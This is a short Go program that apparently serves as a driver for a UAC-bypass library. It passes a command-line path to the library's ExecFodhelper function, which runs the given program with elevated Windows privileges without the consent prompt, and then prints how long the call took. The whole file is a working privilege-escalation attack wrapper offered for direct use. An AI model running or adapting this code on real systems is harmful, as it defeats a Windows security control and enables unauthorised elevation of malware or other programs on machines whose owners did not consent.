package main

import (
	"fmt"
	once "github.com/0x9ef/golang-uacbypasser/pkg/once"
	"os"
	"time"
)

func main() {
	path := os.Args[1]
	tstart := time.Now()
	err := once.ExecFodhelper(path)
	if err != nil {
		panic(err)
	}
	tend := time.Now()
	fmt.Printf("Time tooked: %.2f\n", tend.Sub(tstart).Seconds())
}
